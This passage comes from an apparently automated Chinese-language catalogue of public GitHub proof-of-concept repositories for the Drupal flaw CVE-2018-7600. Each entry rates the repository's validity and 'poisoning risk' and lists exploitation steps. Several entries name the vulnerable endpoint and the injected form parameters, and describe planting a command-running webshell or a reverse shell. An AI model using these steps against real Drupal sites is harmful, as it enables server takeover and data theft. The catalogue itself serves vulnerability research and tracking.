2.  利用Drupal的参数处理机制，将恶意代码注入到特定参数中（如`name[%23post_render]`、`name[%23markup]`或`element_parents`）。
3.  触发漏洞，导致Drupal执行注入的恶意代码，从而实现远程代码执行。

**项目地址:** [drugeddon/drupal-exploit](https://github.com/drugeddon/drupal-exploit)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #12

**来源**: [CVE-2018-7600-happynote3966_CVE-2018-7600.md](../2018/CVE-2018-7600-happynote3966_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点需要存在漏洞且未打补丁，并且需要网络可达。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。由于Drupal对用户输入验证不足，导致攻击者可以通过构造特殊的请求，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码来看，该漏洞的POC代码是有效的。漏洞库和搜索结果中均提到该漏洞允许远程代码执行，并且存在多个可用的Exploit-DB条目。提供的Python脚本和Ruby脚本均为该漏洞的POC代码，可以被用来验证漏洞的存在。

**投毒风险：**
对提供的POC代码进行分析，发现其中可能存在投毒风险的可能性较低，约为10%。以下是分析结果：
*   Python脚本：该脚本较为简单，主要是发送一个包含恶意payload的POST请求，并在目标服务器上创建一个文件（hello.txt）。没有发现明显的恶意代码。
*   Ruby脚本：该脚本功能更为复杂，包含尝试写入PHP Webshell等功能，相较于Python脚本，风险略高，如果被篡改，可能存在植入恶意PHP代码的可能性。

总的来说，直接运行提供的代码风险较低，但从信誉未知的来源获取的任何代码，在执行之前都应该进行仔细的审查，因为攻击者可能修改这些代码以包含恶意功能。

**利用方式：**
利用方式主要是通过构造恶意的HTTP请求，利用Drupal的某些存在漏洞的参数（例如`element_parents`），将恶意代码注入到Drupal的后端处理流程中，从而实现远程代码执行。具体步骤如下：
1.  确定目标Drupal站点使用的版本是否在受影响的范围内。
2.  根据Drupal版本选择合适的POC代码（Python或Ruby）。
3.  修改POC代码中的目标URL和要执行的命令。
4.  运行POC代码，发送恶意请求。
5.  验证代码是否成功执行（例如，检查目标服务器上是否创建了指定的文件）。

攻击者可利用该漏洞获取服务器的控制权，从而进行恶意活动，例如：数据窃取、恶意软件传播、DDoS攻击等。

**项目地址:** [happynote3966/CVE-2018-7600](https://github.com/happynote3966/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #13

**来源**: [CVE-2018-7600-killeveee_CVE-2018-7600.md](../2018/CVE-2018-7600-killeveee_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且可公开访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞，源于对用户提供的输入验证不足。 

**有效性：**
提供的PoC代码是有效的。PoC.py脚本用于验证目标Drupal站点是否存在漏洞，通过发送特制的请求在目标服务器上创建一个名为hh.txt的文件。Exp.py脚本则利用此漏洞在目标站点根目录下创建一个名为hh.php的后门文件，该后门允许通过GET或POST参数'c'执行任意系统命令。从提供的命令执行结果来看，PoC和Exp都成功执行，验证了漏洞的存在和利用。

**投毒风险：**
分析提供的PoC和Exp代码，没有发现明显的投毒代码。脚本的功能主要是利用漏洞进行验证和创建后门，没有发现恶意修改系统配置、窃取敏感信息或进行其他恶意行为的代码。README.md文件只是简单的漏洞描述和使用说明，没有包含任何可疑内容。因此，可以认为此仓库的投毒风险较低，为0%。

**利用方式：**
漏洞的利用方式是：

1.  **漏洞验证：** 使用PoC.py脚本验证目标Drupal站点是否存在CVE-2018-7600漏洞。
2.  **后门植入：** 如果PoC验证成功，使用Exp.py脚本在目标站点根目录下创建一个后门文件（hh.php）。后门文件包含PHP代码，允许通过GET/POST参数'c'执行任意系统命令。
3.  **远程控制：** 使用WebShell管理工具（如AntSword）连接到后门文件，通过'c'参数执行系统命令，实现对目标服务器的远程控制。

总的来说，该漏洞利用简单，危害巨大，攻击者可以利用该漏洞完全控制未打补丁的Drupal服务器。

**项目地址:** [killeveee/CVE-2018-7600](https://github.com/killeveee/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #14

**来源**: [CVE-2018-7600-knqyf263_CVE-2018-7600.md](../2018/CVE-2018-7600-knqyf263_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者在Drupal服务器上执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点需要运行在受影响的版本范围内，并且需要启用默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 允许远程攻击者利用多个子系统中的缺陷执行任意代码。该漏洞的利用方式通常涉及构造恶意的HTTP请求，该请求包含精心设计的查询参数，这些参数利用了Drupal的输入验证漏洞，特别是与AJAX表单处理相关的漏洞。攻击者可以利用`element_parents`和`#lazy_builder`属性在服务器上执行PHP代码。提供的POC代码通过向`/user/register`端点发送POST请求，并在`mail`参数中注入恶意代码（`exec('echo vuln > hello.txt')`），尝试在目标服务器上创建一个名为`hello.txt`的文件，内容为`vuln`。如果成功创建该文件，则表明漏洞存在且可利用。

**有效性：**
从提供的漏洞信息、搜索结果和漏洞利用代码来看，此POC代码的有效性较高。多个来源表明该漏洞是真实存在的，并且存在公开可用的漏洞利用代码。搜索结果中也提到了针对此漏洞的Metasploit模块。

**投毒风险：**
该仓库中的投毒风险较低，大概在10%左右。Dockerfile文件只是简单的指定了Drupal镜像和维护者信息, README.md文件也只是简单的描述了漏洞和利用方式。exploit.py的代码功能相对简单，目的是验证漏洞的存在，风险较低。然而，仍然存在一定的风险，因为攻击者可能修改`exploit.py`以执行更危险的操作，例如下载并执行恶意软件，或者修改服务器配置。因此，在使用此POC代码时，务必对其进行仔细审查，并在隔离的环境中运行。

**利用方式：**
1.  攻击者构造一个包含恶意payload的HTTP POST请求，发送到Drupal站点的`/user/register`端点。
2.  Payload利用`element_parents`参数和`#lazy_builder`属性，在服务器端触发PHP代码执行。
3.  执行的PHP代码可以将任意命令注入到服务器的操作系统中。
4.  通过访问生成的`hello.txt`文件来验证漏洞是否成功利用。

**项目地址:** [knqyf263/CVE-2018-7600](https://github.com/knqyf263/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #15

**来源**: [CVE-2018-7600-madneal_codeql-scanner.md](../2018/CVE-2018-7600-madneal_codeql-scanner.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可网络访问，可能需要了解一些Drupal站点配置信息。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心中存在远程代码执行漏洞。攻击者可以通过发送特制的请求到未打补丁的Drupal站点来执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果（包括NVD、Rapid7、Tenable等）以及Exploit-DB中的expolit，此漏洞是真实存在的，并且有可用的POC。提供的README.md文件表明存在一个用于CVE-2018-7600的Python利用脚本（尽管这里没有提供脚本本身）。综合来看，利用是有效的。

**投毒风险：**
提供的POC代码只有README.md，内容非常简单，没有发现任何恶意代码或潜在的投毒行为。但是，由于缺失了核心的Python脚本，无法完全确定是否存在投毒风险。假定之后找到的利用脚本来源不可靠，存在修改或添加恶意代码的可能性，因此存在一定的投毒风险。这里给出一个较低的投毒风险概率，假设为5%。

**利用方式：**
漏洞的利用方式是向Drupal站点发送精心构造的恶意HTTP请求，利用Drupal的输入验证缺陷，在服务器端执行任意代码。根据搜索结果，该漏洞影响Drupal的多个子系统，可能利用了Drupal的渲染机制或其他处理输入的方式。攻击者通过构造包含恶意代码的请求参数，例如在URL或POST数据中，可以触发远程代码执行。具体细节取决于Drupal的版本和配置。Metasploit也提供了利用模块。

**总结：**
CVE-2018-7600是一个高危的Drupal远程代码执行漏洞，已经存在公开的POC。尽管提供的POC文件本身没有发现恶意代码，但获取利用脚本时需要注意来源，防范潜在的投毒风险。利用方式是通过构造恶意HTTP请求，利用Drupal的输入验证缺陷执行任意代码。

**项目地址:** [madneal/codeql-scanner](https://github.com/madneal/codeql-scanner)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #16

**来源**: [CVE-2018-7600-mr-won_CVE-2018-7600..md](../2018/CVE-2018-7600-mr-won_CVE-2018-7600..md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致网站完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且允许外部网络访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响Drupal 7.x和8.x的远程代码执行漏洞。攻击者可以通过构造特定的HTTP请求，利用Drupal的多个子系统中的缺陷，在目标服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果和提供的PoC代码，该漏洞的利用是有效的。搜索结果中多个链接表明该漏洞已被广泛利用，并且存在公开的Exploit。

**投毒风险：**
提供的PoC代码相对简单，主要功能是发送一个包含恶意payload的POST请求到`/user/register`，并在目标服务器上创建一个名为`r3dxploit.txt`的文件，内容为“vulnerable to cve-7600-2018 exploit”。代码本身没有明显的恶意行为，如删除文件、上传恶意文件或执行其他危险操作。但是，在实际使用中，攻击者可以将payload修改为更具破坏性的命令，例如下载和执行恶意脚本。此外，代码作者信息中包含了一些可能与恶意活动相关的标识，例如使用“R3DXPLOIT”作为用户名和涉及Root权限的字眼。综合考虑，PoC代码本身存在一定潜在风险，但主要取决于使用者如何修改payload，因此投毒风险初步评估为10%。

**利用方式：**
1.  攻击者构造一个包含恶意payload的POST请求，该payload利用`user_register_form`的ajax功能注入恶意代码。
2.  请求发送到`/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`端点。
3.  Drupal处理请求时，由于输入验证不足，导致恶意代码被执行。
4.  PoC代码中，恶意代码的功能是在目标服务器上创建一个文件，表明漏洞存在。
5.  攻击者可以修改payload执行任意命令，例如反弹shell，从而完全控制目标服务器。

**项目地址:** [mr-won/CVE-2018-7600.](https://github.com/mr-won/CVE-2018-7600.)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #17

**来源**: [CVE-2018-7600-muhammedkayag_CVE-2018-7600.md](../2018/CVE-2018-7600-muhammedkayag_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要Drupal网站启用user register功能，且未及时更新补丁

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心中的未经身份验证的远程代码执行漏洞。攻击者可以通过构造特定的请求，利用Drupal的表单渲染机制，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞影响多个Drupal版本，且存在公开的漏洞利用代码。提供的POC代码利用了Drupal的`/user/register`接口，通过`element_parents`和`ajax_form`参数，以及`mail[#post_render][]`等构造恶意的payload，从而实现远程代码执行。该POC代码的有效性较高，因为很多文章和EXP都在使用此种方法。

**投毒风险：**
查看POC代码，发现其功能是发送恶意请求以利用漏洞并在目标机器上建立反向shell。在提供的代码里，存在一个比较明显的风险是，如果攻击者修改了 `command` 变量，有可能植入恶意后门，该变量定义了反向shell连接的目标 IP 地址和端口。 还有就是代码中包含的利用成功后的提示信息，如果被篡改，可能导致用户误判，这些地方存在一定的投毒风险。综合来看，代码的投毒风险为10%，主要是因为利用代码本身功能比较直接，修改后容易被发现。

**利用方式：**
1.  **目标确定：** 确定目标Drupal网站，且版本在受影响范围内（Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1）。
2.  **监听端口：** 使用`listener()`函数在攻击机上监听指定端口（默认为1337），等待反向shell连接。
3.  **构造Payload：**  构造恶意的POST请求，利用`user/register`接口，并设置`element_parents`、`ajax_form`、`mail[#post_render][]`等参数，将要执行的命令嵌入到`mail[#markup]`中。
4.  **发送请求：** 使用`requests.post()`函数将构造好的Payload发送到目标Drupal网站。
5.  **建立连接：**  如果目标网站存在漏洞且利用成功，目标机器会执行Payload中的命令，即建立与攻击机指定端口的反向shell连接。
6.  **交互式Shell：**  连接建立后，`listener()`函数会将终端设置为raw模式，实现与目标机器的交互式shell会话。

**项目地址:** [muhammedkayag/CVE-2018-7600](https://github.com/muhammedkayag/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #18

**来源**: [CVE-2018-7600-nika0x38_CVE-2018-7600.md](../2018/CVE-2018-7600-nika0x38_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要目标Drupal站点存在漏洞且可网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon 2）是一个存在于Drupal多个子系统中的远程代码执行漏洞，影响多个使用了默认或常见模块配置的Drupal版本。攻击者可以通过构造特制的请求来利用此漏洞，从而在目标服务器上执行任意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，此漏洞是真实存在的，并且有公开可用的PoC代码。搜索结果表明，该漏洞被广泛利用，并对大量Drupal网站造成了影响。因此，提供的漏洞利用代码大概率有效，可以用于远程代码执行。

**投毒风险：**
提供的代码片段是`Cargo.lock`文件，该文件是Rust项目的依赖锁定文件，用于记录项目中使用的所有依赖项及其版本。该文件本身不包含任何可执行代码，因此不存在投毒风险。

**利用方式：**
利用方式通常涉及发送特制的HTTP请求，其中包含恶意代码，该代码将被Drupal服务器执行。具体利用方式取决于Drupal的配置，常见的利用方式是利用Drupal的renderable arrays特性，在请求参数中构造恶意的renderable arrays，触发PHP代码执行。攻击者通常会利用此漏洞执行系统命令，例如下载并执行恶意脚本，或者在服务器上安装后门。

**项目地址:** [nika0x38/CVE-2018-7600](https://github.com/nika0x38/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #19

**来源**: [CVE-2018-7600-r0lh_CVE-2018-7600.md](../2018/CVE-2018-7600-r0lh_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站存在漏洞且允许未授权用户访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。攻击者可以通过构造恶意请求，利用Drupal的多个子系统（默认或常见模块配置）中的缺陷，在服务器上执行任意代码。 

**有效性分析：**

根据漏洞库信息和搜索结果，此漏洞是真实存在的，并且影响了多个Drupal版本。漏洞利用代码（PoC）的存在进一步证实了漏洞的可利用性。PoC代码的分析表明，它通过构造一个特殊的请求到`/user/register`路径，利用`element_parents`参数中的注入点执行命令。该PoC代码使用`drupal_ajax`的`_wrapper_format`，允许绕过一些安全检查。PoC首先设置目标URL，然后进入一个循环，该循环允许用户输入命令。命令通过`bash -c`执行，并将输出写入`poutput.txt`文件，然后读取此文件以显示命令的执行结果。

**投毒风险分析：**

分析提供的Go代码和相关文件，没有发现明显的投毒代码。该代码的主要功能是利用CVE-2018-7600漏洞在目标Drupal服务器上执行命令。代码使用`net/http`库发送HTTP请求，并使用`golang.org/x/net/proxy`库支持SOCKS5代理。代码从标准输入读取命令，并通过POST请求将其发送到目标服务器。然后，代码从服务器读取命令的输出并将其打印到标准输出。虽然该代码本身不包含恶意行为，但漏洞利用本身可能被滥用。

**利用方式总结：**

1.  **漏洞入口点：** `/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`
2.  **攻击方式：** 通过POST请求，利用`mail[#post_render][]`、`mail[#type]`和`mail[#markup]`参数注入恶意代码。
3.  **命令执行：**  `mail[#markup]`参数中包含要执行的bash命令，利用`bash -c`执行。
4.  **结果获取：** 命令执行结果被写入`poutput.txt`文件，然后通过GET请求获取。
5.  **利用流程：**
    *   构造包含恶意代码的POST请求发送到漏洞入口点。
    *   Drupal解析请求并执行`mail[#markup]`参数中的命令。
    *   执行结果写入`poutput.txt`文件。
    *   攻击者通过GET请求读取`poutput.txt`文件获取命令执行结果。

**缓解措施：**

*   尽快将Drupal升级到不受影响的版本（7.58及以上，8.3.9及以上，8.4.6及以上，或8.5.1及以上）。
*   应用官方提供的补丁。
*   实施Web应用防火墙（WAF）规则来检测和阻止利用此漏洞的攻击。

**项目地址:** [r0lh/CVE-2018-7600](https://github.com/r0lh/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #20

**来源**: [CVE-2018-7600-r3dxpl0it_CVE-2018-7600.md](../2018/CVE-2018-7600-r3dxpl0it_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要目标Drupal站点未打补丁且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本，允许未经身份验证的远程攻击者执行任意代码。漏洞产生的原因是由于Drupal在处理用户输入时，对某些请求参数过滤不严，导致可以注入恶意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，存在多个公开可用的漏洞利用代码（Exploit-DB等），并且有报告表明该漏洞已被广泛利用，因此该漏洞的POC是有效的。

**投毒风险：**
提供的漏洞利用代码只有GNU GENERAL PUBLIC LICENSE，是一个开源协议，不存在后门或者恶意代码,投毒风险为0。

**利用方式：**
利用方式主要通过构造恶意的HTTP请求，向Drupal服务器发送包含恶意代码的参数。恶意代码通常通过`#`和`[]`进行注入，利用Drupal的渲染机制执行PHP代码。攻击者可以执行任意系统命令，控制服务器。

根据搜索结果，攻击者通常利用以下方式：
1.  发送包含恶意payload的POST请求到Drupal站点。
2.  利用Drupal的渲染机制执行payload中的PHP代码。
3.  在服务器上执行任意命令，例如安装后门、窃取数据等。

**项目地址:** [r3dxpl0it/CVE-2018-7600](https://github.com/r3dxpl0it/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #21

**来源**: [CVE-2018-7600-rabbitmask_CVE-2018-7600-Drupal7.md](../2018/CVE-2018-7600-rabbitmask_CVE-2018-7600-Drupal7.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可公开访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，也被称为Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。漏洞原因是由于Drupal在处理某些请求时，未对用户输入进行充分验证，导致攻击者可以在未经身份验证的情况下，通过构造特制的请求来执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以判断该漏洞是有效的，并且存在公开可用的POC。

**投毒风险：**
提供的POC代码主要包含两个Python脚本：

*   `CVE-2018-7600-Drupal7-EXP.py`: 该脚本接收目标URL、命令、执行函数、代理等参数，通过构造恶意请求，向目标Drupal站点发送包含命令的payload，从而执行任意代码。
*   `CVE-2018-7600-Drupal7.py`: 该脚本通过读取`target.txt`文件中的目标URL，批量执行`whoami`命令，并将结果保存到`result.txt`文件中。
*   `README.md`: 描述了脚本的使用方法。

仔细分析这些代码，未发现明显的恶意行为或后门。`CVE-2018-7600-Drupal7.py` 脚本批量扫描是封装了`whoami`的exp。

但是，仍然存在一定的投毒风险，主要体现在以下几个方面：

1.  **依赖风险：** 脚本可能依赖于特定的第三方库，如果这些库被恶意修改，可能会导致脚本执行恶意代码。
2.  **命令注入风险：**  虽然脚本主要执行的是 `whoami` 命令，但是攻击者可以修改脚本，执行其他更具危害性的命令，比如删除文件、修改配置等。EXP.py允许自定义执行命令，存在风险。在使用时需要注意目标和命令。

总体而言，该仓库中作者隐藏的投毒代码的风险较低，大约为5%。

**利用方式：**

1.  **目标探测：**  使用`CVE-2018-7600-Drupal7.py` 脚本,通过提供包含目标URL的 `target.txt` 文件，批量扫描存在漏洞的Drupal站点。
2.  **漏洞利用：**  使用`CVE-2018-7600-Drupal7-EXP.py` 脚本，指定目标URL和要执行的命令，通过构造恶意请求，在目标Drupal站点上执行任意代码。 EXP.py允许自定义执行函数passthru，同样存在风险。
3.  **结果验证：**  检查命令执行的结果，确认漏洞是否成功利用。

**总结：**
CVE-2018-7600是一个高危的远程代码执行漏洞，攻击者可以利用该漏洞在Drupal站点上执行任意代码。虽然提供的POC代码本身不存在明显的恶意行为，但是仍然存在一定的投毒风险。在使用这些代码时，需要谨慎评估风险，并采取相应的安全措施。

**项目地址:** [rabbitmask/CVE-2018-7600-Drupal7](https://github.com/rabbitmask/CVE-2018-7600-Drupal7)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #22

**来源**: [CVE-2018-7600-rafaelcaria_drupalgeddon2-CVE-2018-7600.md](../2018/CVE-2018-7600-rafaelcaria_drupalgeddon2-CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点必须使用受影响的版本，且未打补丁。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal的Forms API中存在属性注入缺陷，允许未经身份验证的攻击者通过构造特制的请求来执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的POC代码是有效的。漏洞库信息明确指出存在远程代码执行，搜索结果中也确认了该漏洞的严重性和广泛利用。提供的Python脚本`drupalgeddon2.py`允许测试目标是否易受攻击，并执行任意命令。

**投毒风险：**
虽然提供的代码可以直接利用漏洞执行命令，但仍然存在一定的投毒风险，例如：
*   该仓库只包含简单的利用脚本和一个README,代码量少,检查难度低. 
*   代码中利用`requests`库发送HTTP请求，如果被篡改，可能会向恶意服务器发送敏感信息或执行其他恶意操作.因为代码量少,只有10%的风险。

**利用方式：**
该漏洞的利用方式如下：
1.  攻击者构造一个包含恶意参数的HTTP POST请求，发送到目标Drupal站点的`user/password`路径。
2.  恶意参数利用了Drupal Forms API中的`#post_render`属性，允许攻击者指定一个PHP函数（例如`passthru`）来执行命令。
3.  `name[#markup]`参数包含要执行的操作系统命令。
4.  目标Drupal站点处理请求时，会执行攻击者指定的命令。
5.  攻击者可以通过`?q=/file/ajax/name/%23value/` 获取命令执行的结果。

总之，CVE-2018-7600是一个严重的安全漏洞，允许远程攻击者执行任意代码。提供的POC代码是有效的，但使用者应谨慎使用，并注意潜在的投毒风险。

**项目地址:** [rafaelcaria/drupalgeddon2-CVE-2018-7600](https://github.com/rafaelcaria/drupalgeddon2-CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #23

**来源**: [CVE-2018-7600-rajaabdullahnasir_CVE-2018-7600-Remote-Code-Execution.md](../2018/CVE-2018-7600-rajaabdullahnasir_CVE-2018-7600-Remote-Code-Execution.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要Drupal网站运行在受影响的版本，且允许未授权访问的URL。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。由于Drupal的Form API（FAPI）在处理AJAX请求时，未充分清理数组值，导致未经身份验证的攻击者可以通过构造恶意请求来执行任意代码。利用方式通常涉及发送包含恶意payload的POST请求到特定Drupal路径（例如/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax）。

**有效性：**
根据漏洞库信息、搜索引擎结果（如NVD、Rapid7、Trend Micro等）以及提供的POC代码，此漏洞是真实存在的，并且存在公开可用的利用代码。POC代码提供单目标、多目标、自定义命令执行等功能，并具有彩色CLI输出和日志记录，增加了利用的便利性，因此该POC代码有效。

**投毒风险：**
分析提供的`drupalgeddon2.py`代码片段，未发现明显的恶意投毒代码。代码主要功能是发送HTTP请求，执行命令，并解析结果，都是漏洞利用的正常行为。虽然存在远程代码执行的风险，但这是漏洞本身的性质，而不是POC引入的额外风险。README中存在免责声明，强调该工具仅用于授权的渗透测试。投毒风险评估为10%，主要考虑到以下几点：
* 代码的复杂性可能隐藏不易察觉的后门。
* 作者有可能在后续版本中添加恶意代码。

**利用方式：**
1.  确定目标Drupal网站是否运行在受影响的版本（Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1）。
2.  使用提供的POC脚本，指定目标URL和要执行的命令。
3.  运行脚本，脚本会发送特制的HTTP POST请求到Drupal网站。
4.  如果漏洞存在，Drupal网站将执行指定的命令，并将结果返回给攻击者。
5.  攻击者可以利用此漏洞进一步控制服务器，例如安装恶意软件、窃取数据等。

**项目地址:** [rajaabdullahnasir/CVE-2018-7600-Remote-Code-Execution](https://github.com/rajaabdullahnasir/CVE-2018-7600-Remote-Code-Execution)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #24

**来源**: [CVE-2018-7600-raytran54_CVE-2018-7600.md](../2018/CVE-2018-7600-raytran54_CVE-2018-7600.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未授权远程代码执行

**影响版本:** Drupal 7.x < 7.58, Drupal 8.x < 8.3.9, Drupal 8.4.x < 8.4.6, Drupal 8.5.x < 8.5.1

**利用条件:** 目标Drupal站点启用user_register_form或者其他存在可利用的Form API Ajax Request的模块

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。攻击者可以通过构造恶意的请求，利用Drupal的Form API中的漏洞，在目标服务器上执行任意代码。

**有效性分析：**

根据提供的漏洞库信息、搜索结果以及漏洞利用代码，该漏洞的POC代码是有效的。搜索结果中包含了多个关于该漏洞的分析、利用以及修复建议，证明该漏洞在野外被广泛利用。

提供的Python POC利用了user_register_form，通过修改mail字段，构造恶意的payload，将命令注入到#post_render中，触发远程代码执行。代码首先构造包含恶意命令的POST请求，发送到/user/register，然后尝试读取/res.txt，如果成功读取，则表明目标存在漏洞，并输出命令执行结果。

**投毒风险分析：**

